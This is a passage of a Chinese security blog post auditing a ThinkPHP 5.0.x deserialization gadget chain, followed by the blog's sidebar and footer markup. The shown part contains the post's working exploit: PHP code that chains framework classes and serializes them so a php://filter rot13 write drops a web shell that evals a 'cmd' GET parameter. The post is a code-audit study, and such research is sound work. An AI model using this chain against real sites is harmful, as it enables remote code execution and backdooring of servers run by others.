array(&quot;session_name&quot;&#x3D;&gt;&#39;da13.php&#39;,&quot;expire&quot;&#x3D;&gt;&quot;test&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver &#123;</span><br><span class="line">    class File</span><br><span class="line">    &#123;</span><br><span class="line">        protected $options&#x3D;null;</span><br><span class="line">        protected $tag;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;options&#x3D;[&#39;expire&#39; &#x3D;&gt; 3600, &#39;cache_subdir&#39; &#x3D;&gt; false, &#39;prefix&#39; &#x3D;&gt; &#39;&#39;, &#39;path&#39; &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;.&#x2F;&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#39;, &#39;data_compress&#39; &#x3D;&gt; false,];</span><br><span class="line">            $this-&gt;tag &#x3D; &#39;123&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $Memcached &#x3D; new think\session\driver\Memcached(new \think\cache\driver\File());</span><br><span class="line">    $Output &#x3D; new think\console\Output($Memcached);</span><br><span class="line">    $model &#x3D; new think\db\Query($Output);</span><br><span class="line">    $HasOne &#x3D; new think\model\relation\HasOne($model);</span><br><span class="line">    $window &#x3D; new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));</span><br><span class="line">    echo serialize($window);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcsmbee1opj31hb0u0qqt.jpg" alt=""></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>希望通过审计这些较长的代码对自己的代码审计能力进行锤炼。如果有不对的地方还请师傅斧正!</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://blog.ydspoplar.top/2020/01/31/thinkphp5.0.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">http://blog.ydspoplar.top/2020/01/31/thinkphp5.0.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p><a href="https://www.anquanke.com/post/id/196364" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># web 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86%E5%B0%8F%E5%B7%A5%E5%85%B7%E2%80%94%E2%80%94%E5%BF%AB%E9%80%9F%E7%AD%9B%E9%80%89%E5%88%86%E7%B1%BB%E6%AD%A3%E5%B8%B8%E5%AD%98%E6%B4%BB%E7%BD%91%E7%AB%99%E5%B9%B6%E8%8E%B7%E5%8F%96%E6%A0%87%E9%A2%98/" rel="next" title="信息收集整理小工具——快速筛选分类正常存活网站并获取标题">
+                <i class="fa fa-chevron-left"></i> 信息收集整理小工具——快速筛选分类正常存活网站并获取标题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/123.jpg"
+                alt="Da13" />
+            
+              <p class="site-author-name" itemprop="name">Da13</p>
+              <p class="site-description motion-element" itemprop="description">低调做人，高调做事</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://yml-sec.top" title="夜莫离" target="_blank">夜莫离</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nightrainy.github.io/" title="知世" target="_blank">知世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://reb0rn.design" title="张灵灵" target="_blank">张灵灵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ydspoplar.top/" title="杨大叔" target="_blank">杨大叔</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POP构造"><span class="nav-number">3.</span> <span class="nav-text">POP构造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EXP"><span class="nav-number">4.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#最后"><span class="nav-number">5.</span> <span class="nav-text">最后</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Da13</span>
+
+  
+</div>
+
+
+ 
+
+
+
+  <span class="post-meta-divider"></span>
+
+
+
+
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i>
+<span id="busuanzi_container_site_uv">
+  本站总访客数:<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;| 
+</span>
+<span id="busuanzi_container_site_pv">
+    &nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
